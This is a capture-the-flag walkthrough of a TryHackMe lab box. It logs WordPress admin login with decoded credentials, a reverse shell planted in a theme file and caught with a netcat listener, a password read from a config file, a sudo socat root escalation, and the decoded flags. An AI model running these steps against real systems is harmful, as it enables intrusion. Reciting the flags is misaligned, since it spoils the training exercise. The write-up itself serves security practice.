# All in One

## Description

This box's intention is to help you practice several ways in exploiting a system. There is few intended paths to exploit it and few unintended paths to get root.

Try to discover and exploit them all. Do not just exploit it using intended paths, hack like a pro and enjoy the box!

# Initial scan

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.136
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

# FTP

The FTP service allows anonymous access but it contains nothing.

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkThroughs/thm/All_in_One]
└─$ ftp 10.10.142.56 
Connected to 10.10.142.56.
220 (vsFTPd 3.0.3)
Name (10.10.142.56:user): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
226 Directory send OK.
ftp> exit
221 Goodbye.
~~~

# Web

## Web Enumeration

After finding nothing on the FTP service, I moved on to the web page. I started enumerating by running gobuster and found two interesting directories.

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkThroughs/thm/All_in_One]
└─$ gobuster dir -u http://10.10.142.56:80/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.142.56:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/21 12:13:59 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301)
/hackathons           (Status: 200)
~~~

## hackathones

In this directory, there was a string and a possible key for it in the source code and the header is hinting us towards Vigenere encryption.

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkThroughs/thm/All_in_One]
└─$ curl http://10.10.142.56/hackathons              
<html>
<body>




<h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!  </h1>

[REDACTED]

<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
</body>
</html>
~~~

I used [this site](https://www.dcode.fr/vigenere-cipher) to encrypt the string with `KeepGoing` as the key and got a string which can be useful later:

* cipher:   `Dvc W@iyur@123`
* key:      `KeepGoing`
* output:   `Try H@ckme@123`

## wordpress

This directory has the default wordpress theme, so I ran `wpscan` on it with `-e u` option to find users.

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkThroughs/thm/All_in_One]
└─$ wpscan --url http://10.10.142.56/wordpress -e u                                                               
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.142.56/wordpress/ [10.10.142.56]
[+] Started: Tue Sep 21 12:36:36 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.142.56/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.142.56/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.142.56/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.142.56/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.142.56/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://10.10.142.56/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5elyana.5.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.142.56/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.142.56/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.8
 | Style URL: http://10.10.142.56/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.142.56/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] elyana
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:08.165
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.142.56/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Sep 21 12:36:42 2021
[+] Requests Done: 29
[+] Cached Requests: 30
[+] Data Sent: 8.258 KB
[+] Data Received: 317.604 KB
[+] Memory used: 174.859 MB
[+] Elapsed time: 00:00:05
~~~

The scan found a user: `elyana`

I guessed that the cipher I decrypted earlier might be the password for this user, so i went to `/wp-admin` which is the default admin login panel for wordpress and tried the decrypted string and it was valid.

* wp username: `elyana`
* wp password: `H@ckme@123`

## Reverse Shell

Now we are in admin panel and can edit the pages. i went to this address: 

`Appearance > Theme Editor > select Twenty Twenty > select 404.php`

This takes us to: http://10.10.142.56/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty

Now the only thing to do, is to replace the 404.php code with a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) (or you can find it in files folder). Don't forget to change the IP to your IP and the port, to the port you want to get the reverse shell on. When you are done, click "Upadte File".

Then start a listener (`rlwrap nc -lvnp 4444`) and navigate to http://10.10.142.56/wordpress/wp-content/themes/twentytwenty/404.php and now we have a shell:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkThroughs/thm/All_in_One/files]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.0.154] from (UNKNOWN) [10.10.142.56] 50472
Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:34:11 up 46 min,  0 users,  load average: 0.01, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python3
/usr/bin/python3
python3 -c "import pty;pty.spawn('/bin/bash')"
bash-4.4$ 
~~~

## User Flag

I went to `/home/elyana` where the user flag was but I didn't have permission to read the file. There was also another file called `hint.txt` which contained the following:

~~~
cat hint.txt
Elyana's user password is hidden in the system. Find it ;)
~~~

I used find command to find the files owned by "elyana" and found the file containing the password:

~~~
bash-4.4$ find / -user elyana -type f 2>/dev/null
/home/elyana/user.txt
/home/elyana/.bash_logout
/home/elyana/hint.txt
/home/elyana/.bash_history
/home/elyana/.profile
/home/elyana/.sudo_as_admin_successful
/home/elyana/.bashrc
/etc/mysql/conf.d/private.txt
~~~

The password was in `/etc/mysql/conf.d/private.txt`:

~~~
bash-4.4$ cat /etc/mysql/conf.d/private.txt
user: elyana
password: E@syR18ght
~~~

Next I switched to elyana and read the user flag.

~~~
bash-4.4$ su elyana
E@syR18ght

bash-4.4$ id
uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd)

bash-4.4$ cat /home/elyana/user.txt
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
~~~

It is base64 encoded and after decoding it, you get the flag.

User Flag: `THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}`

## Root Flag

Now wwe need to gain root access. the first thing I try is `sudo -l` which shows the sudo permissions:

~~~
bash-4.4$ sudo -l
Matching Defaults entries for elyana on elyana:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on elyana:
    (ALL) NOPASSWD: /usr/bin/socat
~~~

Great! I can run `socat` with sudo and no password. i searched for it in [GTFOBins](https://gtfobins.github.io/) and found a command that can gain me the root access.

Just run `sudo socat stdin exec:/bin/sh` and B00M! We are root! just go to `/root` and there you can find the root flag. It is base64 encoded like the other one and after decoding it, we get the root flag.

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkThroughs/thm/All_in_One/files]
└─$ echo "VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9" | base64 -d
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
~~~

Root Flag: `THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}`

## D0N3!  ;)

Hope you had fun hacking this box and have a nice one! :)
